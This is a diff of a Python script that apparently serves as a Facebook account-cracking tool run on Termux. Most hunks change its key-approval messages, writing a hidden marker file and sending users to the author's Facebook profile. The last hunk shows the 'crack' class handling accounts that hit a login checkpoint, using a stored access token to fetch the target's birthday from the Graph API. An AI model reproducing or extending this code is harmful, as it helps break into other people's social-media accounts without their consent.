@@ -104,13 +104,13 @@ def main_apv():
         print ("[*]--------------------------------------------------------------")
         print ("")
         myid=uuid.uuid4().hex[:10].upper()
-        print ("          YOUR KEY : "+ak+yd)
+        print ("          YOUR KEY : "+ak+myid)
         print ("[*]--------------------------------------------------------------")
         kok=open('/data/data/com.termux/files/usr/bin/.wasi-cov', 'w')
         kok.close()
         print ("")
         print ("")
-        print ("     Copy Key And Sent Me WhatsApp Approvel Your Key ")
+        print ("     Copy Key And Sent Me Facebook  Approvel Your Key ")
         print ("[*]--------------------------------------------------------------")
         time.sleep(6)
         os.system("xdg-open https://www.facebook.com/profile.php?id=100052683424097")
@@ -127,7 +127,7 @@ def main_apv():
         print ("          THIS IS YOUR KEY BRO")
         print ("[*]--------------------------------------------------------------")
         print ("")
-        print ("          YOUR KEY : "+ak+ky1)
+        print ("          YOUR KEY : "+ak+key1)
         print ("[*]--------------------------------------------------------------")
         print ("     Copy Key And Sent Me WP Approvel Your Key ")
         print ("[*]--------------------------------------------------------------")
@@ -264,7 +264,7 @@ class __crack__:
 				break
 			elif 'checkpoint' in ses.cookies.get_dict():
 				try:
-					token = WASI('token.txt').read()
+					token = SIAM('token.txt').read()
 					cp_ttl = requests.get('https://graph.facebook.com/%s?access_token=%s'%(user,token)).json()['birthday']
 					month, day, year = cp_ttl.split('/')
 					
